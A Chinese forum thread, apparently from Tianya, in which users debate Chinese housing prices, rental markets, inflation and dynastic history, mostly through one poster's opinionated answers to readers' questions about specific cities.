如果仅指北漂而言，一般大学毕业的普通北漂白领有个几年经验的月薪大概是8000-15000不等吧。北漂几年的普通家庭月收入在15000-20000. 这个收入，即使在现在，在北京五环以外买房还是没问题的。 低于这个收入，真的考虑回家吧 一二线买房只会越来越难，最终租房会成为主流 在北京一个年薪15万的普通家庭仍然买的起房，在五环外，只是你愿不愿意买。 但以后一个年薪15-20万的普通家庭买房子，即使是五环外的，也只能是梦想了。 租房将成为今后小白领主流的生活方式。 人需要一个安身之所，能买早买比晚买好 房价是由土地决定的，而土地是咱们这个国家的根本，当年不就因为要改变土地的属性，才有了我们的党。 凡房屋也都是只有土地的使用权，土地属于国家，说收回的话不管你有无房证更不会和住房者商量，如（拆迁），这个性质决不变，想下，对有房者如此，会为了没有房子的而制定均衡均分的土地政策下降房价吗？ 现在贫富分化越来越严重，真买的起房的考虑的重点不会是贷款，买不起的，房价跌去三分之一也还是买不起，不要看政府如何了，如果能少贷款或不贷款买处房的话就买吧，人早晚得有个安身之所，不要贪大求全，战争或地震来了房子不值钱，但万一战争或地震不来呢？ kkndme 没错，就是这个意思，如果战争来临，你手中的钱也变成废纸 股市 新智战者： 楼主对楼市的分析让人佩服！能否谈谈股市？现在的股市不管涨跌，我只是看到ZF在疯狂的发行新股大盘股，压大盘是肯定的了，看样子又是下一盘很大的棋！ kkndme： 你要注意2010年的股市与以往是不同的。因为股指期货的出现。 要时刻关注股指期货投入的资金量。 当股指期货资金量足够大的时候（什么叫足够大就要看个人的判断了），期指将指导沪深300指数。大盘会跟着固执期货走 如果房价不涨，那其他产品会怎么涨 lfastro： \"上帝欲使其灭亡，必先使其疯狂！\" 很想看看\"报复性上涨\"是个什么样子。 kkndme： 你可以这样理解（只是为了理解方便做个示意）： 假设房价从2004年的4000一平，涨到2010年的20000一平 猪肉从2004年的6块一斤，涨到2010年的10块一斤。 但是如果房价2004年4000一平，到了2010年还是4000一平 那么，猪肉从2004年的6块一斤，将在2010年涨到30块一斤，不仅猪肉，还有大米，小麦，大蒜、葱、姜、房租都会翻几倍的价格。 zf如何利用公租房控制租房市场 中年不惑吗： 政府要垄断房租市场？市场上已有的和不断要产生的出租房源政府怎么让它们消失呢？ 还是说政府要造足够多的公租房来占据市场主体 那就更难了 要花多少钱呀 公租房的地段好不了的 kkndme： 公租房将为房租市场树立一个标杆。有了这个标杆，私人出租房将会对比公租房做一个参照。 公租房是有限的，是需要申请的，而私人出租房会在相同位置将自己的房租定价高于公租房。 这样就保证了公租房的价格低于市场。 公租房不是廉租房，zf要持续赚钱，他的定价不会低，私人房就会定得更高，这将导致市场上的房租整体上涨。 公租房的吸引力在哪里？ 对体制内会有单位补贴 对体制外人员可以提供一个较长的稳定租期。 zf定价的标杆作用，无论怎么定价，公租房都会低于周边市场价格. 城中村不会长期存在 中年不惑吗： 城中村可是提供廉价房源的地方 这个公租房的竞争对手肯定要被政府干掉 所以城中村的拆迁改造那是一定的 kkndme： 城中村一定会消失的，不消灭城中村，哪来的GDP 三四线城市的未来 alice_xg： 写得非常好 楼主能否分析下未来三四线小城市的发展，是否会空心化 另外，请分析下海南的城市有没有投资价值 kkndme： 四线城市房价也会缓步上涨，但比较慢，主要还是因人工成本，原材料价格上涨造成的建筑成本上涨。 城市的空心化可能性不大，人口仍然会缓慢增长。但偏远乡镇却存在空心化的可能。 海南具备得天独厚的海岸线资源，这是全国任何一个其他海滨城市无法比拟的（其他的海滨确实比较差，毫无美感）。但关键还是zf如何开发，急功近利的开发，和毫无节制的圈海岸线可能会大幅降价海南的旅游与投资价值。 取决于政策，有较高风险 房租价格涨不上去，本质是买房还看起来有希望 今天下午才出门，上午闲来无事，跑来再说两句。 一是再说说房租问题，房租的发展趋势： 现在房租低的一个重要原因是因为，大多数都市小白领还希望能够买一套属于自己的产权房，至少他们觉得即使现在钱钱不够，但是努力一把，跳个脚还能够得着。所以他们省吃俭用拼命的存钱。一个月薪10000块的小白领租一套月租金3000元的还算舒适的两居室是没有问题的，但是他为了攒钱买房宁可几个人合租一室，仅仅愿意在居住上花费少得可怜的500元钱。 随着国家队的进入，民营资本的退出，房地产开发和房地产投资的门槛都会大幅度提高，投资房产以后就成为富人的专属。 小白领的生活将变得\"轻松\"，因为除非能够上位，否则一般人跳脚是够不到属于自己的那套房子的。对于拥有房产失去希望，将使他不得不搬出合租房而转而租住一套还算舒适的两居室。 高昂的商品房价把大量的小白领从合租房中解放出来，转而去租住两居室或者三居室。 房租的价格一定会通过市场发现功能，找到他的位置。 想住清合吗： 看了那么久，突然间觉得，楼主会不会过于武断了？ 尽管我也看好房价和房租都上涨，但是，买房应该不会只是富人的专属。例如在日本，有许多的普通白领买的起房，难道在中国，白领就买不起吗？ kkndme： 白领是分层次的，有技术，有能力，有背景，肯吃苦的白领将通过努力获得更多的收入，获取更高的职位，走进金字塔的中层，买房子肯定没有问题。但进入金字塔中层的绝不会占大多数比例。 低级白领，公司办公室普通职员，一无技术，二无资 没有特殊的技能或本领，又没有什么关系和背景，对机会的把握能力也不是很强，如果家里也不富裕，这样的同志今后买房子就比较困难了。金字塔的底层人数比例是最大的。 日本的国情确实跟中国有很大不同，另外日本东京的房子也不是普通白领买的起的。我认识个NEC的部长（相当于中国企业的总监），也算大企业的中层干部，他也在东京买不起房子，家在离东京很远的郊区。 中年不惑吗： 日本的城市化已完成 不过东京市中心的房子小白领是买不起的 他们买的是东京卫星小城市的房子 如同你在上海工作 去扬州买房子还是能承受的 人家的地铁一个小时能跑200公里 你说生活半径能扩大多少呢 再说日本是有选票的 kkndme： 没错，就是这个道理。天涯里有些人说年薪30万买不起房，年薪70万买不起房。原因还是期望太高了，以为自己年薪70万了，就是人上人了，就必须住市中心的大房子。 但事实上市中心的大房子是绝对稀缺的，人上有人，天外有天。 买房子还是量力而行。有1000万资产的人是买不起价值2000万的翡翠的。有1个亿资产的人也不能买下故宫的居住权。 稀缺房的价格永远涨 sunxishila： 我认为房价不可能跌的（至少5年内） ，尤其北上广，因为 地球资源就那么点，美国人不可能允许所有的人都过上他们那样的高消耗生活，所以美国人就尽可能地创造无产阶级国家来为其当奴隶进行打工，中国的现状也一样，利益集团以及国家政府为了其利益以及维稳庞大的执政集团必须要通过工具将更多的人丧失生产资料以便当其奴隶。试想如果人人都有房住，人人都有闲钱可以自由的选择生活方式，我们以出口为主的血汗工厂还能招得到工人吗？北上广还能存在这么多外资企业吗？外资企业没的话，没这么多就业机会，所有的外地人回家了，上海的办公楼，出租房不全完蛋了 ，那么势必减少了各种税收，那么北上广正常的维持城市运行的资金必将断裂...怎么可能呢。 适度宽松的货币政策（也就是过量发行的货币）必将导致通货膨胀，在中国货币多了必将走进房地产，因为在中国基本没有别的更靠谱的投资渠道。长期看来，货币一直是贬值的 ，世界上几乎所有的国家货币一直都在贬值，这是货币的固有属性，就是剥削。除非取消货币，可能吗？ 房价下跌或者价格合理当然是有可能的，可是这取决于政治，除非取消一党执政，除非土地似有话，原因相信大家都清楚，你们认为近期可能吗？ 粮食和房子的不同是，房子无法和土地剥离 二是再说说粮食问题 中国的粮食实行储备制度，国家每年从农民手里收购一定数量粮食以及进口一定数量的粮食用于储备。 中国的稻米主要出自东北和广西，东北米好吃但产量小价格高，广西米难吃但产量达价格低，都市人都愿意花高点的价格购买东北米。 各地储粮通行的做法是以储粮为名收购的东北米加价在市场上出售牟取利润，再低价收购难吃的广西米用于粮食储备。 米在市场上的价格差别还是很大的，好的东北米可以卖到5块钱一市斤，一般的东北米卖到3块钱左右一斤，差点的东北米卖到2块钱一斤。而广西米基本在2块钱以下，而且除非比较穷的，一般人都不愿意吃。 大家可以看到在市场上交易的大米跟其他商品并没有什么不同，好的稀缺的就贵，差的产量大的就便宜。 但是米和房子不同，一方面米是当年的好吃，放到第二年陈了就不值钱了，第二年土地上新的稻子又长出来，会有新的米下市。但是房子不会，一栋楼今年卖掉了，明年这块已经卖掉了的土地并不能长出另外一栋楼。另一方面，中国实行的储备粮制度将会在粮食减产的时候平易粮食价格的上涨（尽管储粮和市场上销售的粮食完全不是一个品质），而且国家对口粮的问题会高度重视。 粮食作为商品本身是与土地剥离的，而房屋作为商品却无法从土地剥离出来。这是粮食与房子的根本不同。 商人在粮食稀缺时期进行囤积会枪毙，在粮食丰收时期囤积粮食只能亏损（第二年的米就没人吃了。 商品房作为商品在市场上交易，而保障房是为了保障低收入群体的最基本居住，这与粮食分为储备粮和商品粮又多少有些相似。 但是商品房土地和房屋无法剥离，产权和居住权却是剥离的，这就使既保障人民的基本居住权，又通过产权的升值牟取巨大的利益成为可能。zf实在是再明白不过了。 购买房价基数低的省会城市，怎么都不会亏的 Razerwu： 我也年纪小，07年才毕业，学经济的，人文历史基础有一点，关注房价有两年了。看了楼主帖子，更是开朗了。 升斗小民一定要跟形式跑，千万别一厢情愿，也别被媒体的话语误导了。 以后，征服会逐渐保证居者有其屋，但是不是每个家庭住的房子有自己产权。中国社会阶层分化很严重。主要分体制内和体制外两个群体。体制内的即使明摆着的收入一般，但是福利好。体制外的，有高薪的，但是低收入的更多。我们公司一般在年收入到手5-6W左右。这个应该是这个城市的平均水平了。我相信50%的人都在这个数。这个收入租个房子，除去其他生活开支，一年还能余个1,2W，如果是两个人一起生活，也能养小孩的，只是，你永远买不起自己的房子。 但是我也知道，更多的小白领，在空调房里工作，一个月就领1000来块的薪水，而那里房价也不低，8000-10000了。你还是买不起。 所以，未来你可以选择在房价高的地方生活，然后租房。你也可以选择回到三四线城市。但是很可能，到时候那里的房子价格也不低，如果你能力够，还是有希望买到商品房。 非常有钱的人很多，我不知道他们会怎样投资。 我想给一些跟我一样收入层次的人一些建议。 物价必涨，这是趋势，如今农村的农民都不怎么种地了，征服在搞平整，以后都会自动流转，每个村的徒弟承包给一个人，别的农民给他打工。有资金的农村出来的，可以考虑往农业方向发展。 我薪水收入一般，但是有外快，跟女友一块存钱，年收入超过20W， 楼主在帖子里提到长沙和石家庄的例子，我认为，二三线城市也要具体分析，像我老家长沙，房产升值空间还是有的，只要每年涨20%，我就满足了。一线城市的房子更稀缺，但是，城市化的进程，不可能继续像上一个10年那样，大家都往一线城市跑了。所以，房地产暴涨的时代我不相信还有。我还相信二线城市和一线的房价差距会慢慢拉近。 所以，我用09年的结余，在今年上半年长沙贷款买了一套，我准备下半年再买一套。我不是炒房，我是略有结余的工薪阶层，我选择保值，总比放在银行要好。事实证明我是对的上半年买的现在已经涨了10%了。 一线和省会城市的商品房，未来一定会成为更加稀缺的资源。 kkndme： 长沙的房子一定会涨，只不过涨得会比其他城市慢。 低价买涨幅滞后的房子有一个好处，一旦长沙放出\"大量拆迁\"等利好因素，你就赚大了。购买房价基数低的省会城市，怎么都不会亏的 房地产是资本市场还是实体经济？ 还有一个关于实体经济的问题，房地产是资本市场还是实体经济？ 我们回顾一下，房地产的居住属性和产权属性是剥离的。 依照房地产的居住属性，房地产绝对属于实体经济。 从下游来说，不搬新家重新购买一套家具、一套家电、做一次大的装修的可能性都不大。在没有改善住房的前提下，去换家具家电，搞装修的应该是一个很小的比例。 从上游来说，钢铁、水泥、机械等行业无一不受到到房地产的影响。 房地产影响到钢铁、水泥、机械、家电、家具、建筑建材等多种领域，影响真的不小。 依照房地产的产权属性，房地产又是资本市场。 资金推动了商品房价格的快速上涨。 房地产为政府积聚了大量的财富（卖地），这些财富用来建造地铁、公园、广场、办公大楼、公款招待、潇洒挥霍，又推动了实体经济的增长。 什么是傻空 关于买房量力而行的事，还是有必要再说得清楚些的。 还是打个比方 假设某人家庭月收入15000块（都市小白领的通常收入），工作6年，手里有50万存款，我可以在北京北五环外（比如西三旗或者回龙观）买一套价值150万的房子（2万每平米，70几平米）。首付50万，贷款100万，月供7000多，是完全买的起的，而且因为轻轨的开通，即使在市中心工作，上班时间肯定可以在2个小时之内（作为北京这个城市来说是可以接受的）。 但是这个人心比较高，非要在北四环内，买一套100平的住宅，二手房3万一平米，100平米就是300万。首付按30%算，也就是90万，还要贷210万，已经完全超过了他的收入水平及收入预期。于是这个人成天怨天尤人，成天喊自己买不起房，抱怨zf，憎恨炒房客和开发商。天天叫唤社会不公平。 过了1年，国家队布局完毕，西三旗、回龙观房价涨到30000一平米了，买个70平的还要210万。首付30%，要60多万，贷款150万，月供12000左右。这时，他买西三旗70多平米的房子已经很费劲了。 这种行为叫什么？这就叫傻空。 什么是真买不起房 再比如说 某人家庭月收入比较低，8000块，在北京上班，西三旗和回龙观的房也要150万的总价，是买不起的。他的收入水平只能在密云或者河北买房子，但是即使在密云或者河北买了房也没办法上班。这个人就叫做真的买不起房。 如果他对未来的收入预期也不是很高的话，房价未来的上涨将使他进一步对买方绝望，他将彻底放弃攒钱买房，带着老婆孩子搬出跟人合租的城中村，每月花费2500块钱在回龙观租一间两室一厅的住宅。 日子就这么过下去了。 量变将引起质变，8000块钱的家庭月收入，是真买不起房的家庭，而15000月收入的家庭买不起房就叫傻空。 具体情况具体分析，如果看不懂，一定是没有抓住问题本质 小时候看春秋战国之类的书籍，总弄不明白一个问题： a国家跟c国家打，他的邻国b就会很害怕，害怕a国家灭了c国家实力更强大，对自己不利。 e国家跟g国家打，他的邻国f就会很高兴，高兴e国家与g国家两败俱伤，自己可以获取利益。 后来我终于弄懂了。 当a国家跟c国家打仗时，如果a的国力明显强过c,他的邻国b就会很害怕，因为a国家很轻易就会灭掉c国家变得更强大。 当a国家跟c国家打仗时，如果a的国力跟c差不多,他的邻国b就会很高兴，因为a国家跟c国家会拼得两败俱伤。 分析问题，一定要深入的研究啊 桂林 vs 南宁 leeyq88： 楼主的观点高明，因为把房价与整个经济及政治层面的东西联系起来了。请教一个问题，桂林属于5线城市了吧，现在均价近5000，请楼主分析一下桂林这种级别城市房价的趋势。 kkndme： 缓慢上涨，有钱买南宁吧，东盟贸易提供了巨大的空间 公租房的量级不会冲击到商品房市场 vavan2010： 楼主说得好，根据你所描述的，关于房租的这一块，我看到的前景是，由于国家队的加入和垄断，以后开发商只有可能是财雄势大集团的地产商和国家队这两种了。 而大量的建筑公屋，也是要分租赁市场的一杯之羹，又有公租房又有廉租房，再加上物业税的出台，这样愿意持有普通住宅多套的收租客会不会减少？ 因为没钱买的会去租公租或廉租，有钱租的也去租高端好房，就象香港一样，有钱的买商品房，一般的买普通限价房，经济实用房，没钱的住公屋或廉租。反而持有普通住宅多套的会不会逐渐减少？ kkndme： 公租房只能是有一定量，不会是大量，首先解决的也是体制内的住房问题。持有多套住宅的有自己的市场空间 醉生梦思1： 这个问题很好解答，香港公租房占5成比例，私人租房市场委缩了吗？没有，这是市场上不同档次的产品，对应不同的需求。 就像有人看盘，绿化不好，没有游泳池的房子坚决不要是一样的道理。 贵阳，资源的稀缺导致权贵更容易垄断，通过低收入高物价的方式剥削底层群体 旅行的第一站，是贵阳。 一座低收入高消费的西部边远城市。 当地人说贵阳的消费太黑人，太畸形了。大多数当地人的收入相当于中部城市的县城水平，生活必需品的消费却超过了北京。 越偏远的地方越黑暗，越偏远的地方越不存在公平，越偏远的地方贫穷群众的比例越大，越偏远的地方权贵生活的越腐败、越奢华。 越是资源匮乏的地区，权贵阶层越富裕，这是以绝大多数人的贫穷为代价的。 资源的稀缺，导致权贵易于对资源形成垄断，通过以低收入高物价的方式，对底层群体进行赤裸裸的掠夺。 于是权贵们鲜衣怒马，下层群众褴褛衣衫。 贵州难道不是中国的缩影吗？ 在欧洲的商业区，我国权贵们一掷万金，引来欧洲群众围观，瞠目结舌。以至于全世界都没法相信我国不是超级发达国家。 贵阳的近郊房价已经9000一平米，远郊的金阳房价已经接近了6000一平。 但是我们能就此判断贵阳的房价存在巨大泡沫吗？ 贵阳到处是山，地少人多，物产极不丰富。 因此，贵阳的商品房就像贵阳的餐厅一样，和普通群众是完全没有关系的。而对于权贵与精英来说，即使再翻几倍的价格也一样买得起。（腐败啊） 看看贵阳，想想中国。 资源的匮乏将形成高度的垄断，导致贫富分化进一步加剧，生活成本大幅度提高，中国正走向低收入高消费的畸形社会结构，群众生活越艰难，权贵的生活就会越富足。 生活必需品和房价都会变得比西方国家更贵。 fzh_0931： 鉴定完毕，聪明的房托！ 通篇围绕通货膨胀核心立论，既然商品房是商品，那就不具备投资品的一些属性，（帖子里关于清代磁盘子的案例很不错）为什么还要在这里忽悠呢？抵御通货膨胀的手段，除了买房以外还有很多不错的选择，为毛还在这里大谈特谈房价暴涨呢？既然在上世纪90年代是商品房价值发现初期阶段没有买进，那么到了现在这个所谓的价值发现中期或者后期阶段还有什么理由买进呢？（当然，没有自住房的例外，对于投资者来说，眼下投资房产恐怕不是最好的选择）我相信，随着通货膨胀的加剧，我们手里的钞票不断贬值，房子肯定还是会上涨，只不过不是暴涨和普遍上涨，会是局部的，具有某些概念的，那么试问，我们作为普通百姓，怎么才能未卜先知到底是哪一部分的房子会上涨？那一种概念的房子会上涨？恐怕也只有那些个具有神通的精英阶层才能知道，所以作为一个普通小民来说，俺是不会淌这趟浑水滴，俺自己够住就行，真要有天，时来运转，中了六合彩或者虾米大奖之类的，俺实在是不知道那钱做什么用时才会考虑在海南？还是杭州？抑或是南京买所蜗居来等待升值，否则俺只能望房兴叹。。。 kkndme： 从2005年开始 傻空眼里 凡是认为房价不会降的都是房托 凡是买房子的就认为49年加入国民党的。 装成傻空专骗真傻空的人，一面天天喊着房价暴跌，一面抄了一套又一套 真傻空除了骂街恨社会，什么也没得到 重庆：高层和别墅怎么选？ yourrainbow： Lz还在吗？咨询下重庆房价的走势呀！ 投资别墅与高层的比较！ kkndme： 我个人很不喜欢重庆这个城市，但是我不得不说重庆的发展空间很大，无论是经济还是房价。 别墅，如果有钱投资，一定是别墅，只要不是太偏远的。 hollybible2018： 我给你解释为什么楼主推荐别墅了。看问题不是看短时间内，而是要看长远。 第一，中国富裕阶层追捧什么房型？别墅。要想富，先学会用富人的思维方式思考问题。 第二，随着中国经济越来越强，人均住房面积会进一步增加，人们选择的房型会由公寓逐渐转移到别墅。 第三，如果你有在欧美，日本这些发达国家的生活经验，你会知道，公寓是给穷人住的地方，而稍微收入可以的住的都是别墅型的房子。我国按照这样的发展趋势，是能达到这些发达国家的水平。我国曾经现在将来发生的事情都是那些发达国家曾经现在发生的事情。 货币贬值 刚从青岩古镇玩回来，饭前说说货币贬值。 货币贬值，来自于大量的印钞 可不可以少发点钞票。 对不起，不行。 这是我国的官有经济体制决定的。 为什么美国人工高于中国，但大多数商品的物价却低于中国 凡是去过美国的朋友，会惊奇一个现象 除了人工服务行业，几乎大多数产品的绝对价格都低于国内。 从数码产品，到奢饰品，从矿泉水，鸡蛋到汽车，统统比国内的绝对价格（把美金换成人民币，再拿人民币进行比较）便宜。（美国的餐馆比较贵是因为包含了人工服务成本） 不仅仅是美国货比在中国卖的便宜，几乎所有made in china的商品在美国卖的绝对价格都低于国内售价（一件国内生产出口的服装在美国售价150人民币左右，但在国内售价竟然达到800-1000人民币） 贫穷的发展中国家——我们的物价却远远高于美国，这是什么样的原因呢？ 我想主要还是我们的体制决定的： 1、高昂的行政成本 中国庞大的公务员队伍对货币的消耗达到惊人的程度。任何一种商品的销售都要分摊政府高昂的行政开支。不大量印钞票是无法维持正常运转的 2、过渡依靠政府投资。 大家都知道，中国的经济发展，是依靠政府投资为主导的，全世界都知道，政府投资的效率是最底下的，1个亿的投资往好了说只能产生3000万的效益，剩余7000万损耗掉了。因此政府不得不持续增加货币发行量 3、惊人的fb成本 一集中箱货物运到美国的成本甚至低于从北京运到深圳的国内运费。这是令人惊讶的事情，又是确凿的事实。中国高昂的高速费用使物流贵得吓人，从农民手中2分钱收购的蔬菜，运到了目的地，成本就变成了1元钱。 这中间不仅仅是高速费，当公路及铁路运输变得紧张的时候，你不得不花费比高速费更贵的支出用于打点关系。 关系的成本已经远远贵过商品本身。惊人的fb成本是物价上涨的重要原因，因为权贵贪心也是逐年增加的，fb成本越来越高。fb成本的每年高速增长，迫使印钞需求高速增长。 4、低附加值产品出口创汇 低附加值产品出口创汇是我国经济发展的主要支柱。 可以这样理解，我们的商品卖到了国外，换回的是外汇。国内的商品少了，就变贵了。换回的外汇，国家就会按照外汇的总金额依据汇率全都印成人民币，投放到社会。社会上不但商品变少了，每年还会多印出一大堆钞票，这就是通货膨胀。货币的购买力在持续贬值，国家通过货币持续贬值来收割普通劳动者的羊毛。 所以说我国高通胀，货币持续贬值，是官有经济体制所决定的。 是不可能改变的。 持有闲置现金的风险，比持有任何一种可保存的商品的风险都大。 还能上车的赶紧上车 奉劝那些盼着zf政策出打击房产直到崩盘，以此得到高潮的同志们，真的不要等了，除非出现明末的极端事件，否则一辈子等不到高潮。 也奉劝希望房价能降个30%-50%好买套自己的房子的善良百姓，还是看有什么机会多挣点钱吧，等房价大降真的不现实。 百姓们希望领导们能给自己做个主，可是几千年以来，中国的上位者们从来都只考虑一个问题：\"卧榻之上，岂容他人安睡。\"真的没有时间管你们的那些小事儿。 中年不惑吗： 大家应该知道所谓的康乾盛世，开元盛世都是什么样子了 上层阶级的盛世而已 底层老百姓在史书上连\"某人甲，某人乙\"都留不下 dantez13： 康乾确实是虚假的所谓\"盛世\"开元还是不错的 看历史不光纵向看 也要横向看 kkndme： 开元盛世留下巨大的隐患才导致玄宗悲惨的人生，不应简单的认为是杨玉环和安史之乱的原因。 首先是大量的土地兼并，大量的农民同志逃跑，社会的不安定为安史之乱埋下了隐患。还有就是节度使的权力太大，以全国之力供养节度使的军备，而内地养了一群废兵。 相当于老大把精兵干将派去边远山区收保护费，结果自己身边连个像样的保镖都没有。有个收保护费的领班突然不爽，自己想当老大，带着打手跑回去揍老大，准备上位。这时老大就光杆司令一个，看着自己的手下叛变之能干瞪眼 dantez13： 我说的看历史纵向横向的意思是指 康乾时期 纵向来看 还算是个稳定时期 但是17 18世纪 欧洲正轰轰烈烈的搞工业革命 乾隆却几下江南 还搞什么骑射乃满洲之本 而开元时期 ，虽然的确有很多隐患 但是大唐还是当之无愧的世界老大 唐朝也是那个时候达到的巅峰 kkndme： 呵呵，大唐当世界老大也不知道是好事还是坏事 欧洲经历了漫长的中世纪黑暗时代，结果由诸侯割据的封建社会直接进入了资本主义社会，并向国家社会主义过渡。 中国早在秦就结束了诸侯国林立的封建时代，进入了大一统高度集权的帝国时代，到现在也没完全结束。 武汉：城市发展空间的大小，往往和房价的升值空间成正比 dantez13： 挨楼主好近 呵呵 请教一下楼主对武汉这个城市的看法 房价 以及将来发展的空间 今年刚在武汉出手两套房 kkndme： 对武汉的房价真没研究过，不敢妄言。但很看好武汉这个城市的发展。城市发展空间的大小，往往和房价的升值空间成正比，虽然不是绝对 权利让革族成为苗族的一支 刚从大山深处（枫香）出来，做了6个小时车，到榕江现城，居然赶上全程停水，狂晕。 枫香是革家聚居区，名族识别的时候本来应该定为革族，结果苗王（也是贵州shengzhang)一句话就把完全不同祖先的革族变成苗族的一支啊。这就是权利的力量。 房价是否会跌，如果会，会怎么跌 几天没有上来，发现来了很多比较鸡冻的同志。心情可予以理解。 但是鸡冻并不能让日子过的更好。 油价大涨小跌，我们鸡冻了，但是事实并没有改变。 高速费早就收回成本，可是依然雷打不动的收着，我们鸡冻了，可是事实也没有任何改变。 房价就能真如很多人所愿，使劲跌到人人买的起吗？今后的现实将告诉我们答案。 房价会不会跌？ 我说在较远的将来一定会跌，但下跌的方式是完全不同的。不可能象大家所期望的由2010年的30000一平跌到2004年的6000一平。 下跌一定是另一种方式：当农产品价格以几年翻10倍甚至几十倍的速度上涨的时候，房产却相对滞涨。这是最有可能的下跌方式。 通货膨胀是减缓灭亡最好的良药 最善良的意愿并不能阻止事务向邪恶的方向发展。 我们大家都很清楚却都没关注的一个常识，当我们满怀热情无偿献血的时候，有哪个贫穷的患者在需要输血时，能够因为广大群众的无偿献血而得到医院的优惠吗？ 不能，无论你是穷是富，只要你是平头百姓，你都不得不因为需要输血而支付昂贵的医药费。 同样，zf并不会因为拆迁给你补偿的太低，而强迫开发商降低房价卖给群众。压低建设成本，抬高售价，中间的利润由商人和权贵进行分配，这是官商结合的通行做法。自古以来，能够赚大钱的都是红顶商人，而不是普通个体户。 对于很多鸡冻的群众，指着鼻子问我：国家会不管吗？疯狂难道不是导致灭亡吗？ 我告诉你，通货膨胀就是减缓灭亡时间的最好良药 被忽悠的群众： 请楼主解释一下 通货膨胀是zf偷偷掠夺人民财富的手段，极少数人暴利，怎是良药？？？ kkndme： 通货膨胀是zf偷偷掠夺人民财富的手段，极少数人暴利————没错，通货膨胀就是剪老百姓的羊毛，让权贵的财富更集中，中下层群众更贫穷。 但是，从国家的统治与巩固来讲，的确是良药啊（当然有一定限度）。 当大多数资源掌握在少数人手中的时候，占有绝大多数的金字塔下层的群众能够分配到的资源就越少，资源的价格就会越高，少数的金字塔中上层的既得利益者就会越富有。 大家知道，有些资源会变成富人间的游戏（比如现在的古董，字画），完全失去群众基础；而如果与生活密切相关的资源过度集中，一定会爆发极端冲突事件，造成社会动荡。 zf通过不断稀释货币的实际购买能力，并且对粮食等生活必需品实行平准制度，一方面保证了绝大多数人民的基本吃饭问题，另一方面让中下层群众手中的余钱基本消耗在特定的商品上，以至于不得不马不停蹄的劳作，这才能保证社会的稳定和向前发展。而上层精英就可以坐享其成。 让我们回顾一下过去 80年代，那时的人们靠省吃俭用积攒出节余，被消耗在自行车、手表、缝纫机上。通过不断的劳动，才能吃饱饭，才能攒点钱买三大件取媳妇。 80年代末，90年代初，人们的工资提高了，手里的结余增加了，彩电、冰箱的大规模普及又消灭了老百姓手中的流动性。 紧接着电话、空调又接过了彩电、冰箱的大旗。那时安装个电话可要5000大元啊。 随着工业化水平大幅度提高，经济高速增长，货币发行量也迅速增加，彩电、冰箱等工业化大规模产品已经不具备稀缺资源的特性，也无法吸收百姓手中庞大的结余资金。 汽车和商品房的发展成为消灭老百姓手中的流动性的最好工具。 在经济发展的大潮中，一旦对资源的支配权可以换取利益，贫富两极分化是发展的必然。随着贫富分化开始加剧，财富集中在少部分人手中，集中了大量财富的少部分人已经不满足于购买普通的消费品（汽车是工业化的产物，不具备稀缺性），对投资品的追捧造就了2005年房地产的崛起。 房地产具备了投资品和生活必须品的双重属性，即可以让金字塔中上层的精英群体依靠房地产保值增值，又可吸收掉中下层群众的未来若干年的结余资金。 大量印刷的货币还是有一定数量留到勤劳肯干的白领手中的，而这些货币又因为通货膨胀因素消耗在不断上涨的生活必需品上，必需品中商品房占了大头。 于是拥有大量房产的金字塔中上层精英可以坐享其成，享受房产升值带来的收益，而中下层群众不得不为房子打工。 发行大量货币满足经济发展的需要，同时通过通货膨胀来消灭广大群众手中的流动性，是zf稳定社会，发展经济的法宝，适度的通货膨胀当然是缓解社会矛盾的良药 tjOOSAN： 楼主！这段话，我不是很明白。 好像世界上，每个国家都是如此把？谁会不买东西？谁会不买生活必须品？ 别忘了，中国发展到现在，百姓也没有能力购买一切生活必须品！当然，随着社会的发展，人民在一点一点的去完善基本生活。 这你却说成。。。精英和国家的阴谋。。。我。。。很难理解。 稳定粮食价格，这对每个国家而言，都是必须的啊！？？这最最基本了吧？ 房子为什么涨价？？？国家决策！懂吗？间接取消了经济适用房政策。市场上百分之九十都是商品房！！你告诉我，房价能不涨吗？ 房价涨了，受益人是谁？？？是政府！！不是你嘴里所谓的精英，他们只是傀儡罢了！ kkndme： 不是阴谋，我没提过一句阴谋，是国策 好比美国，以中产阶级利益为代表的美国，一个币值相对稳定的国家，主导借钱消费，这就是国策。 当08年的金融危机，多数中产却尝到了惨痛的教训。而在美国的华人，因为热爱储蓄的原因（这跟美国币值相对稳定、华人储蓄习惯都有关系），生活并没有受到太大影响。 货币供应不足是明朝的真正原因 明朝末年，可怜的崇祯皇帝面临的最可怕的问题貌似两个:一是努尔哈赤的入侵；一是大饥荒下，到处闹蚁贼。光是努尔哈赤的入侵，明末的关宁铁骑完全可以将满人挡在山海关外；光是蚁贼肆虐，凭洪承畴、孙传庭等名将镇压一群乌合之众还是易如反掌的；内忧外患才导致了明朝的灭亡。这是通行的说法。 明朝灭亡的真正原因，是经济原因。 当然，这也是句废话，无论是社会的稳定，还是国家的动乱，或者邻国间的战争，都是经济原因导致的。 明朝真正灭亡的原因是：货币供给不足。 不要说百姓的经济行为受到很大制约，即使是军队也发不出饷银。以至于除了关宁铁骑以外，明朝就找不出一支有战斗力的军队，甚至洪承畴、孙传庭打高迎祥、李自成、张献忠，居然靠农民军的馈赠过日子。 货币供给不足，明朝的经济崩溃了。 经济问题是导致清朝灭亡 再谈谈鸦片战争和那个满脑子浆糊的林则徐。 鸦片战争的原因，在于大清国与欧洲诸国之间存在的巨大贸易顺差。 大清虽然闭关锁国，丝绸、茶叶、瓷器通过民间和官员私下大量出口欧洲换取白银，却没有任何的进口需求。以至于英、法国家不得不世界范围开采银矿，但依然不能满足采购中国商品的需求。 英法诸国必须要与中国通商贸易，才能解决贸易顺差这个根本的问题。英国人实在不知道拿什么商品来进行贸易(貌似中国什么都不需要），于是不法商人想出了鸦片撬开中英贸易缺口的馊主意——这并没有得到英国官方的支持。 但是林则徐同志既不懂得经济，又不懂得外交，对欧洲人的认识也就停留在：我不给你茶叶，你的腿都站不直。 不管洋人打算干什么，总之洋人就是邪恶的，就该抓起来打板子。于是，自然而然的一顿开打，结果可想而知。 于是清朝官员施展出了村骗乡，乡骗县，一骗骗到guowuyuan，的传统技能，咸丰同志在故宫几乎自始至终听到的都是捷报频传。 清末，一会儿闹拳匪，一会儿闹白莲教，一会儿闹太平天国。然而，靠鸡冻的群众杀几个洋毛子并不能使中国变得强大。林则徐如果能够有点知识，不妄自尊大，能够说动咸丰开放正常通商贸易、拒绝鸦片，联军入侵圆明园的事大致可以避免。 经济问题才是导致社会动荡，战争爆发的根源。 挑个刺 第一次鸦片战争清的皇帝是道光不是咸丰 白莲教不是清末的而是清中叶嘉庆年间的 kkndme： 